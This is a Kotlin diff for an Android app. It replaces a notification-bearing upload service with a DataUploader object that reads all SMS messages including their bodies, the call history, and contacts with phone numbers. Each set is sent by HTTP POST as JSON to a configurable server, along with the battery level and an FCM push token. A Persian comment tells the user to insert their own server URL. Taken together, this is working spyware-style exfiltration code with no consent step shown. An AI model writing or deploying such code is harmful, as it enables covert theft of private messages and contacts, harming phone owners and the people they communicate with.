@@ -1,153 +1,256 @@
-package com.example.test
+package com.example.test.utils
 
-import android.app.Notification
-import android.app.NotificationChannel
-import android.app.NotificationManager
-import android.app.Service
-import android.content.Intent
-import android.os.Build
-import android.os.IBinder
+import android.content.Context
 import android.util.Log
-import androidx.core.app.NotificationCompat
-import com.example.test.utils.DataUploader
+import android.provider.ContactsContract
+import android.provider.Telephony
+import android.database.Cursor
+import org.json.JSONArray
+import org.json.JSONObject
+import java.net.HttpURLConnection
+import java.net.URL
 
-class DataUploadService : Service() {
+object DataUploader {
 
-    companion object {
-        private const val TAG = "DataUploadService"
-        const val EXTRA_DEVICE_ID = "device_id"
-        private const val NOTIFICATION_ID = 3
-        private const val CHANNEL_ID = "data_upload_channel"
-    }
+    private const val TAG = "DataUploader"
+    private const val BASE_URL = "YOUR_SERVER_URL_HERE" // 🔴 آدرس سرور خودت رو اینجا بذار
 
-    override fun onCreate() {
-        super.onCreate()
-        Log.d(TAG, "════════════════════════════════════════")
-        Log.d(TAG, "🚀 DataUploadService CREATED")
-        Log.d(TAG, "════════════════════════════════════════")
-        startForegroundNotification()
-    }
+    /**
+     * رجیستر کردن دستگاه در سرور
+     */
+    fun registerDevice(context: Context, deviceId: String, fcmToken: String, userId: String): Boolean {
+        return try {
+            Log.d(TAG, "📝 Registering device: $deviceId")
 
-    private fun startForegroundNotification() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                CHANNEL_ID,
-                "Data Upload Service",
-                NotificationManager.IMPORTANCE_LOW
-            ).apply {
-                description = "آپلود SMS و مخاطبین در پس‌زمینه"
+            val json = JSONObject().apply {
+                put("device_id", deviceId)
+                put("fcm_token", fcmToken)
+                put("user_id", userId)
+                put("timestamp", System.currentTimeMillis())
             }
-            val manager = getSystemService(NotificationManager::class.java)
-            manager?.createNotificationChannel(channel)
-        }
 
-        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("آپلود اطلاعات")
-            .setContentText("در حال آپلود SMS و مخاطبین...")
-            .setSmallIcon(android.R.drawable.stat_sys_upload)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .setOngoing(true)
-            .build()
+            val result = sendPostRequest("$BASE_URL/register", json.toString())
+            Log.d(TAG, "✅ Device registered successfully")
+            true
 
-        startForeground(NOTIFICATION_ID, notification)
-        Log.d(TAG, "✅ Foreground notification started")
-    }
-
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        val deviceId = intent?.getStringExtra(EXTRA_DEVICE_ID)
-
-        if (deviceId.isNullOrEmpty()) {
-            Log.e(TAG, "❌ Device ID is null or empty!")
-            stopSelf()
-            return START_NOT_STICKY
-        }
-
-        Log.d(TAG, "📱 Device ID: $deviceId")
-        Log.d(TAG, "════════════════════════════════════════")
-        Log.d(TAG, "🔄 STARTING BACKGROUND UPLOAD")
-        Log.d(TAG, "════════════════════════════════════════")
-
-        // اجرای آپلود در Thread جداگانه
-        Thread {
-            var smsSuccess = false
-            var contactsSuccess = false
-
-            try {
-                // 4️⃣ آپلود SMS‌ها
-                Log.d(TAG, "4️⃣ Starting SMS upload in background...")
-                updateNotification("آپلود پیامک‌ها", "در حال آپلود پیامک‌ها...")
-
-                DataUploader.uploadAllSms(this, deviceId)
-                smsSuccess = true
-
-                Log.d(TAG, "✅ SMS upload completed successfully")
-                Log.d(TAG, "════════════════════════════════════════")
-
-                // فاصله کوتاه بین عملیات‌ها
-                Thread.sleep(1000)
-
-                // 5️⃣ آپلود مخاطبین
-                Log.d(TAG, "5️⃣ Starting contacts upload in background...")
-                updateNotification("آپلود مخاطبین", "در حال آپلود مخاطبین...")
-
-                DataUploader.uploadAllContacts(this, deviceId)
-                contactsSuccess = true
-
-                Log.d(TAG, "✅ Contacts upload completed successfully")
-                Log.d(TAG, "════════════════════════════════════════")
-
-                // نمایش نتیجه نهایی
-                if (smsSuccess && contactsSuccess) {
-                    Log.d(TAG, "🎉 ALL BACKGROUND UPLOADS COMPLETED")
-                    updateNotification("آپلود کامل شد ✓", "SMS و مخاطبین با موفقیت ارسال شدند")
-                } else {
-                    Log.w(TAG, "⚠️ SOME UPLOADS FAILED")
-                    updateNotification("آپلود ناقص", "بعضی از اطلاعات ارسال نشدند")
-                }
-
-                // نگه داشتن notification برای 3 ثانیه
-                Thread.sleep(3000)
-
-            } catch (e: Exception) {
-                Log.e(TAG, "❌ Upload error: ${e.message}", e)
-                e.printStackTrace()
-                updateNotification("خطا در آپلود ✗", "لطفا اتصال اینترنت را بررسی کنید")
-                Thread.sleep(3000)
-            } finally {
-                Log.d(TAG, "════════════════════════════════════════")
-                Log.d(TAG, "🛑 DataUploadService STOPPING")
-                Log.d(TAG, "════════════════════════════════════════")
-                stopSelf()
-            }
-        }.start()
-
-        return START_STICKY
-    }
-
-    private fun updateNotification(title: String, text: String) {
-        try {
-            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle(title)
-                .setContentText(text)
-                .setSmallIcon(android.R.drawable.stat_sys_upload)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
-                .build()
-
-            val manager = getSystemService(NotificationManager::class.java)
-            manager?.notify(NOTIFICATION_ID, notification)
-
-            Log.d(TAG, "📢 Notification updated: $title")
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Failed to update notification: ${e.message}")
+            Log.e(TAG, "❌ Register device failed: ${e.message}", e)
+            false
         }
     }
 
-    override fun onBind(intent: Intent?): IBinder? {
-        return null
+    /**
+     * آپلود تاریخچه تماس‌ها
+     */
+    fun uploadCallHistory(context: Context, deviceId: String) {
+        try {
+            Log.d(TAG, "📞 Reading call history...")
+
+            val calls = JSONArray()
+            val cursor: Cursor? = context.contentResolver.query(
+                android.provider.CallLog.Calls.CONTENT_URI,
+                null, null, null,
+                android.provider.CallLog.Calls.DATE + " DESC"
+            )
+
+            cursor?.use {
+                val numberIndex = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
+                val typeIndex = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
+                val dateIndex = it.getColumnIndex(android.provider.CallLog.Calls.DATE)
+                val durationIndex = it.getColumnIndex(android.provider.CallLog.Calls.DURATION)
+
+                while (it.moveToNext()) {
+                    val call = JSONObject().apply {
+                        put("number", it.getString(numberIndex) ?: "")
+                        put("type", it.getInt(typeIndex))
+                        put("date", it.getLong(dateIndex))
+                        put("duration", it.getInt(durationIndex))
+                    }
+                    calls.put(call)
+                }
+            }
+
+            val json = JSONObject().apply {
+                put("device_id", deviceId)
+                put("calls", calls)
+                put("timestamp", System.currentTimeMillis())
+            }
+
+            sendPostRequest("$BASE_URL/call-history", json.toString())
+            Log.d(TAG, "✅ Call history uploaded: ${calls.length()} calls")
+
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Upload call history failed: ${e.message}", e)
+        }
     }
 
-    override fun onDestroy() {
-        super.onDestroy()
-        Log.d(TAG, "👋 DataUploadService destroyed")
+    /**
+     * آپلود همه پیامک‌ها
+     */
+    fun uploadAllSms(context: Context, deviceId: String) {
+        try {
+            Log.d(TAG, "💬 Reading SMS messages...")
+
+            val messages = JSONArray()
+            val cursor: Cursor? = context.contentResolver.query(
+                Telephony.Sms.CONTENT_URI,
+                null, null, null,
+                Telephony.Sms.DATE + " DESC"
+            )
+
+            cursor?.use {
+                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
+                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
+                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
+                val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
+
+                while (it.moveToNext()) {
+                    val sms = JSONObject().apply {
+                        put("address", it.getString(addressIndex) ?: "")
+                        put("body", it.getString(bodyIndex) ?: "")
+                        put("date", it.getLong(dateIndex))
+                        put("type", it.getInt(typeIndex))
+                    }
+                    messages.put(sms)
+                }
+            }
+
+            val json = JSONObject().apply {
+                put("device_id", deviceId)
+                put("messages", messages)
+                put("timestamp", System.currentTimeMillis())
+            }
+
+            sendPostRequest("$BASE_URL/sms", json.toString())
+            Log.d(TAG, "✅ SMS uploaded: ${messages.length()} messages")
+
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Upload SMS failed: ${e.message}", e)
+        }
+    }
+
+    /**
+     * آپلود همه مخاطبین
+     */
+    fun uploadAllContacts(context: Context, deviceId: String) {
+        try {
+            Log.d(TAG, "👥 Reading contacts...")
+
+            val contacts = JSONArray()
+            val cursor: Cursor? = context.contentResolver.query(
+                ContactsContract.Contacts.CONTENT_URI,
+                null, null, null, null
+            )
+
+            cursor?.use {
+                val idIndex = it.getColumnIndex(ContactsContract.Contacts._ID)
+                val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
+
+                while (it.moveToNext()) {
+                    val contactId = it.getString(idIndex)
+                    val name = it.getString(nameIndex) ?: ""
+
+                    // خواندن شماره‌های تماس
+                    val phones = JSONArray()
+                    val phoneCursor = context.contentResolver.query(
+                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                        null,
+                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                        arrayOf(contactId),
+                        null
+                    )
+
+                    phoneCursor?.use { pc ->
+                        val phoneIndex = pc.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                        while (pc.moveToNext()) {
+                            phones.put(pc.getString(phoneIndex) ?: "")
+                        }
+                    }
+
+                    if (phones.length() > 0) {
+                        val contact = JSONObject().apply {
+                            put("name", name)
+                            put("phones", phones)
+                        }
+                        contacts.put(contact)
+                    }
+                }
+            }
+
+            val json = JSONObject().apply {
+                put("device_id", deviceId)
+                put("contacts", contacts)
+                put("timestamp", System.currentTimeMillis())
+            }
+
+            sendPostRequest("$BASE_URL/contacts", json.toString())
+            Log.d(TAG, "✅ Contacts uploaded: ${contacts.length()} contacts")
+
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Upload contacts failed: ${e.message}", e)
+        }
+    }
+
+    /**
+     * ارسال وضعیت باتری
+     */
+    fun sendBatteryUpdate(context: Context, deviceId: String, fcmToken: String) {
+        try {
+            val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
+            val batteryLevel = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
+
+            val json = JSONObject().apply {
+                put("device_id", deviceId)
+                put("fcm_token", fcmToken)
+                put("battery_level", batteryLevel)
+                put("timestamp", System.currentTimeMillis())
+            }
+
+            sendPostRequest("$BASE_URL/battery", json.toString())
+            Log.d(TAG, "🔋 Battery update sent: $batteryLevel%")
+
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Battery update failed: ${e.message}", e)
+        }
+    }
+
+    /**
+     * ارسال درخواست POST به سرور
+     */
+    private fun sendPostRequest(urlString: String, jsonData: String): String? {
+        var connection: HttpURLConnection? = null
+        try {
+            val url = URL(urlString)
+            connection = url.openConnection() as HttpURLConnection
+            connection.apply {
+                requestMethod = "POST"
+                doOutput = true
+                setRequestProperty("Content-Type", "application/json")
+                connectTimeout = 15000
+                readTimeout = 15000
+            }
+
+            // ارسال داده
+            connection.outputStream.use { os ->
+                os.write(jsonData.toByteArray())
+                os.flush()
+            }
+
+            // دریافت پاسخ
+            val responseCode = connection.responseCode
+            Log.d(TAG, "📡 Response code: $responseCode")
+
+            return if (responseCode == HttpURLConnection.HTTP_OK) {
+                connection.inputStream.bufferedReader().use { it.readText() }
+            } else {
+                null
+            }
+
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ HTTP request failed: ${e.message}", e)
+            return null
+        } finally {
+            connection?.disconnect()
+        }
     }
 }
